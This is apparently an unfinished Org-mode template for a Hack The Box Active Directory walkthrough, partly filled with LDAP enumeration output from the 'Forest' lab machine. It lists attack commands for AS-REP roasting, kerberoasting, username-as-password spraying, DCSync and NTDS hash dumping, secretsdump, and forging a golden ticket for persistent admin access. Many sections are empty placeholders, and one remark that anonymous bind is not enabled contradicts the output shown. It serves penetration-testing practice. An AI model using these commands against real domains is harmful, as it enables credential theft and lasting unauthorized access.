#+filetags: :Box:HTB:Easy:Windows:LDAP:ActiveDirectory:
#+HUGO_BASE_DIR: ~/Dropbox/40-49_Career/44-Blog/bloodstiller
#+HUGO_SECTION:
#+hugo_custom_front_matter: :draft true
#+hugo_custom_front_matter: :title "<bx> HTB Walkthrough"
#+hugo_custom_front_matter: :author bloodstiller
#+hugo_custom_front_matter: :date 2024-10-10
:HIDDEN:
#+STARTUP: overview
#+STARTUP: hidestars
#+STARTUP: indent
#+STARTUP: entitiespretty
#+STARTUP: inlineimages
#+OPTIONS: H:4 toc:nil num:nil \n:nil ':nil *:t -:t ::t <:t ^:{} _:{} |:t f:t d:nil
#+OPTIONS: tex:mathjax tags:not-in-toc tasks:t title:nil
#+COLUMNS: %80ITEM %TAGS %TODO %SCHEDULED
#+TODO: TODO(t) IN-PROGRESS(i) NOTES(m) RABBITHOLE!(R) | DONE(d!) HOLD(h) WONT-DO(n)
:END:


* <bx> Hack The Box Walkthrough/Writeup:
:PROPERTIES:
:ID:       e3f25c99-179f-461d-9310-dd1f026d4ec1
:END:
- https://app.hackthebox.com/machines/<bx>

* How I use variables & Wordlists:
:PROPERTIES:
:ID:       807d55ef-43ab-462f-9307-7d03330b72d2
:END:
- *Variables*:
  - In my commands you are going to see me use ~$box~, ~$user~, ~$hash~, ~$domain~, ~$pass~ often.
    - I find the easiest way to eliminate type-os & to streamline my process it is easier to store important information in variables & aliases.
      - ~$box~ = The IP of the box
      - ~$pass~ = Passwords I have access to.
      - ~$user~ = current user I am enumerating with.
        - Depending on where I am in the process this can change if I move laterally.
      - ~$domain~ = the domain name e.g. ~sugarape.local~ or ~contoso.local~
      - ~$machine~ = the machine name e.g. ~DC01~
    - Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

- *Wordlists*:

  - I have symlinks all setup so I can get to my passwords from ~~/Wordlists~ so if you see me using that path that's why. If you are on Kali and following on, you will need to go to ~/usr/share/wordlists~
    - I also use these additional wordlists:
      - [[https://github.com/insidetrust/statistically-likely-usernames][Statistically-likely-usernames]]
      - [[https://github.com/danielmiessler/SecLists][SecLists]]
      - [[https://github.com/carlospolop/Auto_Wordlists][Auto_Wordlists]]
* 1. Enumeration:
:PROPERTIES:
:ID:       df114f61-f09f-46bc-a9d0-e1e62bf4d249
:END:
** Assumed Breach Box:
:PROPERTIES:
:ID:       8fdc027e-d7a4-4f54-9c83-4b9d26aa1453
:END:
- This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.
- This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.
- +Note+:
  - Even with assumed credentials, I‚Äôll still conduct my standard enumeration process as if I don‚Äôt have them.
    - This ensures I don‚Äôt overlook any findings just because access is available.
    - Comprehensive documentation of all discoveries remains essential.
** NMAP:
:PROPERTIES:
:ID:       0d42892c-fad3-4440-834b-6ebf6c6f41c3
:END:
*** Basic Scans:
:PROPERTIES:
:ID:       13dd3494-95f0-4c4b-b6b8-85ce11fff991
:END:
+ *Basic TCP Scan*:
  - ~nmap $box -Pn -oA TCPbasicScan~
    #+begin_src shell

    #+end_src
  - *Initial thoughts*:

+ *Basic UDP Scan*:
  - ~sudo nmap $box -sU -Pn -oA UDPbasicScan~
#+begin_src shell

#+end_src
  - *Initial thoughts*:

*** Comprehensive Scans:
:PROPERTIES:
:ID:       38e2ad58-d516-494e-bb6e-0003582ce978
:END:
+ *In depth scan TCP*:
  - ~sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP~
  #+begin_src shell

  #+end_src
  - *Findings*:

+ *In depth scan UDP*:
  - ~sudo nmap -p- -sU -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP~
  #+begin_src shell

  #+end_src
  - *Findings*:

** LDAP ~389~:
:PROPERTIES:
:ID:       6a27f462-51f8-437a-9357-004faa093013
:END:
*** Using LDAP anonymous bind to enumerate further:
:PROPERTIES:
:ID:       558ffa34-2558-47bc-8f37-e1674d74d810
:END:
- If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
  - We can actually retrieve a significant amount of information via anonymous bind such as:
    - A list of all users
    - A list of all groups
    - A list of all computers.
    - User account attributes.
    - The domain password policy.
    - Enumerate users who are susceptible to AS-REPRoasting.
    - Passwords stored in the description fields
  - The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

- I actually have a handy script to check if anonymous bind is enabled & if it is to dump a large amount of information. You can find it here
  - https://github.com/bloodstiller/ldapire
  - https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb
    - ~python3 /home/kali/windowsTools/enumeration/ldapire.py $box~
      - It will dump general information & also detailed & simple information including:
        - Groups
        - Computers
        - Users
        - All domain objects
        - A file containing all description fields
        - It will also search the domain for any service/svc accounts and place them in a folder too.


  A) _We have the naming context of the domain_:
       #+begin_src shell
kali in HTB/BlogEntriesMade/Forest/scans/ldap  üç£ main üìù √ó143üóÉÔ∏è  √ó3üõ§Ô∏è  √ó113 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
üïô 08:32:01 zsh ‚ùØ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box

------------------------------------------------------------
 Server Information
------------------------------------------------------------
  ‚Ä¢ IP Address  : 10.129.95.210
  ‚Ä¢ Domain Name : htb.local
  ‚Ä¢ Server Name : FOREST
  ‚Ä¢ Forest Level: 7
  ‚Ä¢ Domain Level: 7

    #+END_SRC

- It turns out the anonymous bind is (+NOT+) enabled and we get the below information.

  #+begin_src shell
------------------------------------------------------------
 Connection Attempts
------------------------------------------------------------
  ‚Ä¢ Attempting SSL connection...
  ‚úó Failed to connect with SSL
  ‚Ä¢ Attempting non-SSL connection...
  ‚úì Connected successfully using anonymous bind

------------------------------------------------------------
 Security Warning
------------------------------------------------------------
  ‚ö†Ô∏è  WARNING: Connected using Anonymous Bind
  ‚ö†Ô∏è  This is a security risk and should be disabled
  #+end_src

  B) _We have the domain functionality level_:
      #+begin_src shell
  ‚Ä¢ Forest Level: 7
  ‚Ä¢ Domain Level: 7
      #+end_src
     - The functionality level determines the minimum version of Windows server that can be used for a DC.
       - +Note+: that any host os can be used on *workstations*, however the functionality level determines what the minimum version for DC's and the forest.
       - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels
       - Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

       - In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
       - Here‚Äôs a list of functional level numbers and their corresponding Windows Server operating systems:

         | Functional Level Number | Corresponding OS            |
         |                       0 | Windows 2000                |
         |                       1 | Windows Server 2003 Interim |
         |                       2 | Windows Server 2003         |
         |                       3 | Windows Server 2008         |
         |                       4 | Windows Server 2008 R2      |
         |                       5 | Windows Server 2012         |
         |                       6 | Windows Server 2012 R2      |
         |                       7 | Windows Server 2016         |
         |                       8 | Windows Server 2019         |
         |                       9 | Windows Server 2022         |

         - +Note+:
           - Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
           - As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

  C) _We have the full server name & domain name_:
       #+begin_src shell
------------------------------------------------------------
 Server Information
------------------------------------------------------------
  ‚Ä¢ IP Address  : 10.129.95.210
  ‚Ä¢ Domain Name : htb.local
  ‚Ä¢ Server Name : FOREST
       #+end_src
- It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
  + We have the naming context.
  + Domain name.

- The script also has created several files with various amounts on information lets examine those.
  #+begin_src shell
------------------------------------------------------------
 Processing Users
------------------------------------------------------------
[+] Detailed results written to UsersDetailed.txt
[+] Basic names written to Users.txt
  ‚úì Basic user names    ‚Üí Users.txt
  ‚úì Detailed user info  ‚Üí UsersDetailed.txt

------------------------------------------------------------
 Processing Groups
------------------------------------------------------------
[+] Groups written to GroupsDetailed.txt
[+] Basic names written to Groups.txt
  ‚úì Basic group names   ‚Üí Groups.txt
  ‚úì Detailed group info ‚Üí GroupsDetailed.txt

------------------------------------------------------------
 Processing Computers
------------------------------------------------------------
[+] Computers written to ComputersDetailed.txt
[+] Basic names written to Computers.txt
  ‚úì Basic computer names    ‚Üí Computers.txt
  ‚úì Detailed computer info  ‚Üí ComputersDetailed.txt

------------------------------------------------------------
 Processing All Objects
------------------------------------------------------------
[+] Detailed results written to ObjectsDetailedLdap.txt
[+] Basic names written to Objects.txt
  ‚úì Basic object names     ‚Üí Objects.txt
  ‚úì Detailed object info   ‚Üí ObjectsDetailedLdap.txt

------------------------------------------------------------
 Processing Descriptions
------------------------------------------------------------
[+] All descriptions written to AllObjectDescriptions.txt
  ‚úì All object descriptions ‚Üí AllObjectDescriptions.txt
  #+end_src

It will also check for any service accounts and write them to a file:
#+begin_src shell
-----------------------------------------------------------
 Searching for Service Accounts
------------------------------------------------------------
  üîç Searching Users.txt
  - No matches in Users.txt
  üîç Searching UsersDetailed.txt
  ‚úì Found matches in UsersDetailed.txt
  üîç Searching Groups.txt
  ‚úì Found matches in Groups.txt
  üîç Searching GroupsDetailed.txt
  ‚úì Found matches in GroupsDetailed.txt
  üîç Searching Objects.txt
  ‚úì Found matches in Objects.txt
  üîç Searching ObjectsDetailedLdap.txt
  ‚úì Found matches in ObjectsDetailedLdap.txt
  üîç Searching AllObjectDescriptions.txt
  ‚úì Found matches in AllObjectDescriptions.txt

  ‚úì Service account findings written to ServiceAccounts.txt
  ‚úì Found 646 potential matches

#+end_src

*** Checking the objects file:
:PROPERTIES:
:ID:       0077a4d6-6b97-4478-880f-6755a72bdcf8
:END:

*** Searching the descriptions file for any passwords:
:PROPERTIES:
:ID:       a96cef40-b1e9-4c49-870c-6cf2a94db795
:END:

*** Checking the users file:
:PROPERTIES:
:ID:       f7356e49-b6c1-496f-8ae3-497c114b0469
:END:

*** Finding an unlisted service account svc-alfresco:
:PROPERTIES:
:ID:       41c9ab86-d11f-4e08-848f-2a2c1bf9adad
:END:
*** Updating ETC/HOSTS & Variables:
:PROPERTIES:
:ID:       70c39e1a-91a2-4102-898c-d195b5b42155
:END:
- *Updated Domain & Machine Variables for Testing*:
  - Now that I have this information, I can update the ~domain~ and ~machine~ variables used in tests:
    - ~update_var domain "htb.local"~
    - ~update_var machine "forest"~

- *Updating* ~/etc/hosts~ *for DNS and LDAP Queries*:
  - I update my ~/etc/hosts~ file to enable tools like [[https://github.com/ropnop/kerbrute][kerbrute]] for user enumeration and other tools that require DNS or LDAP for queries:
    - ~echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts~

*** Syncing Clocks for Kerberos Exploitation:
:PROPERTIES:
:ID:       d2509b2d-ec58-4483-9d01-3915d8957dc8
:END:
- Since Kerberos is enabled on this host, it's best practice to sync our clock with the host‚Äôs. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
  - ~sudo ntpdate -s $domain~
  - +Note+: I am doing this now as we have the DNS name etc.

** DNS ~53~:
:PROPERTIES:
:ID:       72e6c6aa-a991-4b59-8a1d-9c1967f71edb
:END:
- *Using dnsenum to enumerate DNS entries*:
  - ~dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain~
** Kerberos ~88~:
:PROPERTIES:
:ID:       1a19d7f9-b46c-44e4-902f-dbeb85742df5
:END:
*** Using [[https://github.com/ropnop/kerbrute][Kerbrute]] to bruteforce Usernames:
:PROPERTIES:
:ID:       e9be28c8-168a-48a0-8bc2-f467a8ae3ed8
:END:
- As kerberos is present we can enumerate users using [[https://github.com/ropnop/kerbrute][kerbrute]]:
  - ~kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt~

*** Using netexec for ASReproasting:
:PROPERTIES:
:ID:       b16a1594-64e3-42e9-ae39-168baab3c1b9
:END:
- *We should always try and asreproast with a null/guest session as it can lead to an easy win*:
  - ~netexec ldap $box -u '' -p '' --asreproast asrep.txt~
  - ~netexec ldap $box -u guest -p '' --asreproast asrep.txt~
  - ~impacket-GetNPUsers $domain/ -request~
    - This one will just work, without having to pass anything else.

  - ~impacket-GetNPUsers $domain/ -dc-ip $box -usersfile Users.txt -format hashcat -outputfile asRepHashes.txt -no-pass~
*** Using netexec for Kerberoasting:
:PROPERTIES:
:ID:       9c9985bd-717a-48a9-b628-ce8633a5acba
:END:
- *As we have creds we can kerberoast*:
  - ~netexec ldap $box -u $user -p $pass --kerberoast kerb.txt~
** SMB ~445~:
:PROPERTIES:
:ID:       4f2c7ccb-eaa6-4a32-95c4-87545fd949d6
:END:
*** Attempting to connect with NULL & Guest sessions:
:PROPERTIES:
:ID:       fc63ee15-d711-4a53-818d-b4138791f6e4
:END:
- *This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold*:
  - ~netexec smb $box -u 'guest' -p '' --shares~
  - ~netexec smb $box -u '' -p '' --shares~
- +Note+: We can see the build number is +Insert-Build+ We can now enumerate that.

*** Trying Usernames as Passwords:
:PROPERTIES:
:ID:       51b5cc92-1537-42c7-9e51-a41685758ef6
:END:
- *I always try usernames as passwords as well*:
  - ~netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]~
*** Using smbclient:
:PROPERTIES:
:ID:       57c70b81-c003-468c-954f-add9c67c22fb
:END:
- ~smbclient -U 'guest' "\\\\$box\\<share>"~
*** Enumerating Users with Impacket-lookupsid:
:PROPERTIES:
:ID:       edf3f6be-05e3-4dcf-ab38-7b228174cd29
:END:
- *We can use* ~impacket-lookupsid~ *to enumerate users on the domain*:
  - ~impacket-lookupsid $domain/guest@$machine.$domain -domain-sids~
  - ~impacket-lookupsid guest@$box -domain-sids -no-pass~
  - +Note+: As we are using the "Guest" account we can just hit enter for a blank password

** Searching for known vulnerabilities for the Windows Build number:
:PROPERTIES:
:ID:       0991a49e-2991-42c8-b77c-d903ac1cbd62
:END:
- As we were able to retrive the build number from netexec we can enumerate for known vulnerablities.

** Web ~80~:
:PROPERTIES:
:ID:       d4efb869-5997-4ab8-8e37-f60f433f7e95
:END:
- *Web Enumeration via Burp Suite*:
  - When enumerating a website, always use Burp Suite. This allows you to:
  - Record all potential injection points.
  - Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.
*** Enumerating Injection Points:
:PROPERTIES:
:ID:       1c3b10db-c43e-40bd-a27c-fbd91296b3fa
:END:
*** Dirbusting the webserver using ffuf:
:PROPERTIES:
:ID:       2662f823-d569-4552-8ed3-e48978b5dedb
:END:
- *I Perform some directory busting to see if there are any interesting directories*:
  - ~ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic~
** RPC:
:PROPERTIES:
:ID:       224bdc39-b44b-4c8c-a54b-128716a6f5fa
:END:
- *As we have valid credentials we can also connect to RPC to enumerate further*:
  - ~rpcclient -U $user $box~
- +Cheatsheet+: I have an enumeration & attacking cheatsheet for RPC, available here:
  - https://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient

- *Null session via RPC*:
  - Much like SMB you can also connect to RPC via null & guest sessions, let's see if they are valid here:
    - ~rpcclient -U "" $box~
    - ~rpcclient -U '%' $box~
*** Enumerating domain users via RPC:
:PROPERTIES:
:ID:       5f636d7c-754a-4422-86e5-d2c6f29cd141
:END:
- *We can enumerate all the users of the domain via RPC*:
  - ~enumdomusers~

- *Querying individual users*:
  - Once we have the RID's as displayed above we can enumerate each user further. This is useful to discover if they have anything interesting in their "Description fields etc"
  - ~queryuser [RID]~
*** Enumerating groups via RPC:
:PROPERTIES:
:ID:       7f587aa4-d279-42fb-a234-707b295df4ed
:END:
- *We can also enumerate groups*:
  - ~enumdomgroups~

- *Querying individual groups*:
  - Once we have the RID's as displayed above we can enumerate each group further. Just like we did with users.
  - ~querygroup [RID]~
* 2. Foothold:
:PROPERTIES:
:ID:       12cad379-c0d0-4c07-8b2c-28440c2582cf
:END:
1.
* 3. Privilege Escalation:
:PROPERTIES:
:ID:       d9e6b559-a369-42b5-92da-4ccd104efb1c
:END:
1.
* 4. Persistence:
:PROPERTIES:
:ID:       37a8061a-df18-452e-a13a-025297fb661f
:END:
** Dumping NTDS.dit/DCSync attack:
:PROPERTIES:
:ID:       43858f16-d1b9-48be-a790-bfbd13b17275
:END:
- *Perform DCSync attack using netexec*:
  - ~netexec smb $box -u $user -p $pass -M ntdsutil~

- *Extract all hashes from netexec*
  - ~for file in /home/kali/.nxc/logs/*.ntds; do cat "$file" | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\n'; done~

** Creating a Kerberos Golden Ticket:
:PROPERTIES:
:ID:       7e540f36-bd29-450a-a2af-b11be5822f4d
:END:

+ *Using* ~impacket-lookupsid~ *to get the Search for the Domain SID*:
  - ~impacket-lookupsid $domain/$user@$machine.$domain -domain-sids~

+ *Using* ~impacket-secretsdump~ *to retrieve the aeskey*:
  - ~impacket-secretsdump $domain/$user:$pass@$box~
  - ~impacket-secretsdump $domain/$user@$box -hashes :$hash~
  - ~impacket-secretsdump $domain/$user:$pass@$box~


+ *Sync our clock to the host using ntpdate*:
  - ~sudo ntpdate -s $domain~
  - ~faketime "$(ntpdate -q $domain | cut -d ' ' -f 1,2)"~

+ *Using* ~impacket-ticketer~ *to create the Golden Ticket*:
  - ~impacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator~
  - ~impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator~

+ *Export the ticket to the* ~KRB5CCNAME~ *Variable*:
  - ~export KRB5CCNAME=./Administrator.ccache~

+ *Use the ticket for connecting via* ~psexec~
  - ~impacket-psexec -k -no-pass $machine.$domain~

*** Why create a golden ticket?
:PROPERTIES:
:ID:       5a887352-90e5-435b-9d34-06b32b32d0a5
:END:
- "But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:
  - Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here‚Äôs why:
  - ~KRBTGT~ *Hash Dependence*:
    - Golden Tickets are generated using the ~KRBTGT~ account hash from the target‚Äôs domain controller.
    - Unlike user account passwords, ~KRBTGT~ hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely.
  - ~KRBTGT~ *Hash‚ÄîThe Key to It All (for upto 10 years)*:
    - A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.
    - This makes it a reliable backdoor, especially if re-access is needed long after initial entry.
    - *Think about it*: even if they reset every user‚Äôs password (including the administrator etc) your Golden Ticket is still valid because it‚Äôs tied to the ~KRBTGT~ account, not individual users.
* Lessons Learned:
:PROPERTIES:
:ID:       2c027237-8833-4750-a7e7-4282b86b6b75
:END:
** What did I learn?
:PROPERTIES:
:ID:       6fe78ec6-f538-4653-a4de-987388927bb7
:END:
  1.
  2.
  3.
** What silly mistakes did I make?
:PROPERTIES:
:ID:       9c617b79-9173-496c-a4eb-7d43fb807aee
:END:
  1.
  2.

* Sign off:
:PROPERTIES:
:ID:       52ccdf4f-ff0e-405d-aa9b-42ea204b741b
:END:

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

-- Bloodstiller

-- Get in touch bloodstiller at proton dot me

* +CREDS+:
:PROPERTIES:
:ID:       6c2b5bb7-14bf-4c0d-8b05-2f25e346f0c6
:END:
** Compiled Usernames, Passwords & Hashes:
:PROPERTIES:
:ID:       4f5a86e1-5b54-49c8-a9be-b5e20e3f63bd
:END:
*** Usernames:
:PROPERTIES:
:header-args: :tangle Users.txt :mkdirp yes :perms
:ID:       70c0d96c-a165-436a-984f-d6c3518b9eaf
:END:
#+begin_src text
Administrator
Guest
Root
krbtgt
Admin
#+end_src

*** Passwords:
:PROPERTIES:
:header-args: :tangle Passwords.txt :mkdirp yes :perms
:ID:       15f28104-49ee-43ab-8b58-599d79233039
:END:
#+begin_src text

#+end_src

*** Email Names:
:PROPERTIES:
:header-args: :tangle Emails.txt :mkdirp yes :perms
:ID:       6f5c0eaa-5976-4347-874e-399a302eed66
:END:

#+begin_src text
#+end_src
*** Username & Pass:
:PROPERTIES:
:ID:       c1b57e7a-7037-43ab-9082-4f173be9323f
:END:
#+begin_src text

#+end_src


*** Hashes:
:PROPERTIES:
:header-args: :tangle Hashes.txt :mkdirp yes :perms
:ID:       efdd9b2b-1a20-40d7-b99c-eac4b22b1f0a
:END:
- *Extract all hashes from netexec*
  - *Extract only enabled hashes*:
    - ~grep -iv disabled /home/kali/.nxc/logs/*.ntds | cut -d ':' -f2,5 --output-delimiter=' ' | awk '{print $2, $1}'~
  - *Extract all hashes*
    - ~cat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'~
    - +Note+: We need to include disabled hashes to get the krbtgt hash in this method as that account is disabled by default.

#+begin_src text

#+end_src

** SSH Keys:
:PROPERTIES:
:ID:       a7494955-ab6b-4500-8d5d-e3fb9ef341bf
:END:
